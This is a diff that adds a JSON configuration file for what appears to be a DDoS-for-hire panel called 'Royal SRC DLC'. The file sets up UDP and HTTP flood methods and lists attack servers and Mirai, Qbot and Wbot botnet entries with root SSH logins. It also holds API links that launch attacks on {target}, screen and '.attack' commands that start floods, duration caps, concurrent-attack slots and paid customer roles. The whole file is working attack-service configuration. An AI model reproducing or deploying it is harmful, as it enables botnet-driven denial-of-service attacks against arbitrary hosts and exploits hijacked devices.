@@ -1,0 +1,431 @@
+{
+    "note": "Royal SRC DLC Configuration File - Comprehensive documentation for server, bot, and attack method configurations",
+    "server_list": [
+        {
+            "note": "Layer 4 Attack Server Configuration - Optimized for UDP/TCP flood attacks",
+            "enabled": false,
+            "tag": "LAYER 4 #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Layer 7 Attack Server Configuration - Specialized for HTTP/HTTPS attacks",
+            "enabled": false,
+            "tag": "LAYER 7 #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "bots_list": [
+        {
+            "note": "Mirai Botnet Configuration - Layer 4 Attack Bot",
+            "enabled": false,
+            "tag": "LAYER 4 Mirai #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Mirai Botnet Configuration - Layer 7 Attack Bot",
+            "enabled": false,
+            "tag": "LAYER 7 Mirai #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "enabled": false,
+            "tag": "LAYER 4 Wbot #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "attacks": [
+        {
+            "note": "UDP Attack Method Configuration - High-performance UDP flood attack settings",
+            "custom_api_method_name": "udp",
+            "api_funnel": {
+                "enabled": true,
+                "links": [
+                    {
+                        "Name": "udp",
+                        "link": "http://localhost/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                        "max_time": 1200,
+                        "note_max_time": "Maximum attack duration: 20 minutes (1200 seconds)",
+                        "enabled": true
+                    },
+                    {
+                        "Name": "udp-royal",
+                        "link": "https://google.com/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                        "max_time": 1200,
+                        "note_max_time": "Maximum attack duration: 20 minutes (1200 seconds)",
+                        "enabled": false
+                    }
+                ]
+            },
+            "server_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS ./UDP {HOST} {PORT} 20 {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS ./UDP {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS ./UDP {HOST} {PORT} 50 {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "mirai_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "MIRAI",
+                            "command": "UDP {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "qbot_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "Concurrent Attack Management - Maximum 8 simultaneous attacks",
+                    "max": 3,
+                    "enabled": true
+                },
+                "method_min_time": {
+                    "note_time": "Minimum Attack Duration: 30 seconds",
+                    "time": 30,
+                    "enabled": true
+                },
+                "method_max_time": {
+                    "note": "Attack Duration Limits - Configure hard and soft limits",
+                    "hard": {
+                        "note_time": "Maximum Attack Duration: 24 hours (86400 seconds)",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note_time": "Default Maximum Duration: 2 minutes (120 seconds)",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "Kill_Setup": {
+                "note": "Attack Termination Configuration - Multiple methods to stop attacks",
+                "funnel_api_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "API1",
+                        "api": "http://your-api.com/api/stop?username={username}&password={password}&host={target}",
+                        "note_api": "API-based attack termination endpoint"
+                    }
+                ],
+                "funnel_ssh_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "UDP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note_ssh": "SSH-based attack termination command"
+                    }
+                ],
+                "funnel_bot_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "UDP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note_bots": "Bot-based attack termination command"
+                    }
+                ]
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "Roles_Required": {
+                    "Status_Update": false,
+                    "Holder": false,
+                    "VIP": false,
+                    "Admin": false,
+                    "Reseller": false,
+                    "Owner": false,
+                    "Private": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Target Type Restrictions - Configure allowed target types",
+                        "ip_address": true,
+                        "url": false,
+                        "domain": false,
+                        "subnet": false
+                    },
+                    "method_group": {
+                        "note": "Custom Role ( config.json ) Line 114",
+                        "method_group_name": "main_network",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "Port Configuration - Define port ranges and whitelist",
+                        "method_port_range": {
+                            "note": "Port Range Configuration - Define min/max ports",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Port Whitelist - Specific ports allowed for attacks",
+                            "ports": [
+                                22,
+                                53
+                            ],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "ASN Whitelist - Restrict attacks to specific AS numbers",
+                        "enabled": false,
+                        "as_number": [
+                            "16509"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "note": "HTTP Attack Method Configuration - High-performance HTTP 1.1 flood attack settings",
+            "custom_api_method_name": "http",
+            "api_funnel": {
+                "enabled": true,
+                "links": [
+                    {
+                        "Name": "http",
+                        "link": "http://localhost/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                        "max_time": 1200,
+                        "note_max_time": "Maximum attack duration: 20 minutes (1200 seconds)",
+                        "enabled": true
+                    },
+                    {
+                        "Name": "http-royal",
+                        "link": "https://google.com/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                        "max_time": 1200,
+                        "note_max_time": "Maximum attack duration: 20 minutes (1200 seconds)",
+                        "enabled": false
+                    }
+                ]
+            },
+            "server_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS ./HTTP {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 7 #1",
+                            "command": "screen -dmS ./HTTP {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 7 #2",
+                            "command": "screen -dmS ./HTTP {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "mirai_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack HTTP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "MIRAI",
+                            "command": "HTTP {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "qbot_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack HTTP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".HTTP {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "Concurrent Attack Management - Maximum 8 simultaneous attacks",
+                    "max": 3,
+                    "enabled": true
+                },
+                "method_min_time": {
+                    "note_time": "Minimum Attack Duration: 30 seconds",
+                    "time": 30,
+                    "enabled": true
+                },
+                "method_max_time": {
+                    "note": "Attack Duration Limits - Configure hard and soft limits",
+                    "hard": {
+                        "note_time": "Maximum Attack Duration: 24 hours (86400 seconds)",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note_time": "Default Maximum Duration: 2 minutes (120 seconds)",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "Kill_Setup": {
+                "note": "Attack Termination Configuration - Multiple methods to stop attacks",
+                "funnel_api_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "API2",
+                        "api": "http://your-api.com/api/stop?username={username}&password={password}&host={target}",
+                        "note_api": "API-based attack termination endpoint"
+                    }
+                ],
+                "funnel_ssh_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "HTTP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note_ssh": "SSH-based attack termination command"
+                    }
+                ],
+                "funnel_bot_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "HTTP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note_bots": "Bot-based attack termination command"
+                    }
+                ]
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "Roles_Required": {
+                    "Status_Update": false,
+                    "Holder": false,
+                    "VIP": false,
+                    "Admin": false,
+                    "Reseller": false,
+                    "Owner": false,
+                    "Private": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Target Type Restrictions - Configure allowed target types",
+                        "ip_address": false,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false
+                    },
+                    "method_group": {
+                        "note": "Custom Role ( config.json ) Line 114",
+                        "method_group_name": "layer_7",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "Port Configuration - Define port ranges and whitelist",
+                        "method_port_range": {
+                            "note": "Port Range Configuration - Define min/max ports",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Port Whitelist - Specific ports allowed for attacks",
+                            "ports": [
+                                22,
+                                443
+                            ],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "ASN Whitelist - Restrict attacks to specific AS numbers",
+                        "enabled": false,
+                        "as_number": [
+                            "16509"
+                        ]
+                    }
+                }
+            }
+        }
+    ]
+}
